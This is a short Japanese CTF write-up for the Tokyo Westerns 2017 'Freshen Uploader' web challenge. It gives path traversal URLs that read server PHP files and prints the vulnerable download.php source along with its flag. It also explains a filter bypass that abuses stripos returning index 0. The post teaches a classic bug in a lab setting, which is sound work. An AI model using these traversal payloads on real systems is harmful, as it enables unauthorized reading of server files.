---
layout: post
alias: "/blog/2017/09/04/twctf-2017-freshen-uploader/"
date: "2017-09-04T16:40:28+09:00"
tags: [ "ctf", "writeup", "twctf", "web", "php" ]
---

# Tokyo Westerns CTF 3rd 2017: Freshen Uploader

動的scoringと基本点の結果によりWelcome問より得点が低いの好き。

## solution

### 1

<http://fup.chal.ctf.westerns.tokyo/download.php?f=../index.php> のようにすれば`index.php`, `download.php`が取れる。

`download.php`:

``` php
<?php
// TWCTF{then_can_y0u_read_file_list?}
$filename = $_GET['f'];
if(stripos($filename, 'file_list') != false) die();
header("Contest-Type: application/octet-stream");
header("Content-Disposition: attachment; filename='$filename'");
readfile("uploads/$filename");
```

### 2

`file_list.php`を読みたいが普通に読みにいくと弾かれる。

`stripos($filename, 'file_list') != false` してるが`stripos`が返すのはindexなので: <http://fup.chal.ctf.westerns.tokyo/download.php?f=file_list/../../file_list.php>
